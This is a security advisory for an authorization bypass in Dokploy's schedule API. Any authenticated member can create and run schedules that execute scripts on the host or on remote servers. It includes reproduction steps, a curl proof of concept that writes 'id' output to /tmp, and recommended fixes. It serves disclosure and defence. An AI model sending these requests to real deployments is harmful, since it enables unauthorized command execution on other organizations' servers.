repo.description: ## Summary The `schedule` router does not enforce organization/role checks. As a result, **any authenticated user** can create, update, run, or delete schedules belonging to other organizations if they know the `scheduleId`/`serverId`. Schedule types `server` and `dokploy-server` write and execute scripts on the host or remote servers, enabling **RCE** on the Dokploy host or a target server. ## Impact - Arbitrary command execution on the Dokploy host (`dokploy-server`). - Arbitrary command execution on registered remote servers (`server`). - Unauthorized schedule deletion or abuse. ## Affected Components - `apps/dokploy/server/api/routers/schedule.ts` (create/update/delete/one/runManually/list) - `packages/server/src/services/schedule.ts` (script creation on filesystem) - `packages/server/src/utils/schedules/utils.ts` (script execution) ## Environment Setup (Local) 1. Run the installation as root. 2. Ensure ports `80`, `443`, and `3000` are free. 3. Install Dokploy: ```bash curl -sSL https://dokploy.com/install.sh | sh ``` 4. Open the web UI at `http://:3000` and create the first admin account. 5. (Optional) Open Swagger UI at `http://:3000/swagger` to explore API endpoints. ## Create a Member User + API Key (for repro) 1. As admin: go to `http://:3000/dashboard/settings/users` and create an invitation. 2. Open the invitation link in a new browser (incognito), sign up, and accept. 3. Back as admin: go to `Settings → Users` and enable the member permission **Access to API/CLI**. 4. Log in as the member: go to `http://:3000/dashboard/settings/profile` and generate an API key. ## Steps to Reproduce (Host RCE via dokploy-server) This variant does **not** require a remote serverId. 1. As the member user, call `schedule.create` with `scheduleType: "dokploy-server"` and a script payload. 2. Call `schedule.runManually` to execute it immediately. 3. Verify the command executed on the Dokploy host (e.g., SSH in and read `/tmp/dokploy-pwn`). ## Proof of Concept (Host RCE) ```bash # Create schedule curl -sS -X POST "https:///api/trpc/schedule.create" \ -H "content-type: application/json" \ -H "x-api-key: " \ -d '{ "json": { "name": "pwn", "cronExpression": "* * * * *", "scheduleType": "dokploy-server", "appName": "pwn-sched", "command": "true", "script": "id > /tmp/dokploy-pwn" } }' -w "\n" # Run immediately curl -sS -X POST "https:///api/trpc/schedule.runManually" \ -H "content-type: application/json" \ -H "x-api-key: " \ -d '{"json": {"scheduleId": ""}}' -w "\n" # Verify on container docker ps | grep dokploy docker exec -it /bin/bash cat /tmp/dokploy-pwn ``` ## Optional Variant: Remote Server RCE 1. As admin, register a server under `http://:3000/dashboard/settings/servers` and note its `serverId` (visible in the server detail URL or via Swagger). 2. As the member user, create a schedule with `scheduleType: "server"` and that `serverId`. 3. Run it using `schedule.runManually`. ## Root Cause The `schedule` router never checks `organizationId` or role before invoking service methods. The service layer accepts raw IDs and writes/executes scripts directly on the host/remote server. ## Recommended Fix - Enforce org/role checks on all `schedule` procedures. - Restrict `server` and `dokploy-server` schedule types to owner/admin roles. - Validate that `serverId`/`scheduleId` belongs to `activeOrganizationId`.
repo.summary: Schedule Authorization Bypass Enables Host/Server Command Execution
